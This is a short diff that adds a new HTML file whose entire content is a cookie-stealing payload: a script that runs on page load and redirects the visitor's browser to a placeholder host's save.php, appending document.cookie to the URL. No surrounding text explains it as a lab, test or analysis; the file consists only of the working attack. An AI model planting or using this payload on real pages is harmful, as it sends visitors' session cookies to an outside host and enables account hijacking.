@@ -1,0 +1,6 @@
+<script>
+function go(){
+location.href="http://[YourSite]/save.php?c="+document.cookie;}
+</script>
+<body onLoad="go()">
+</body>
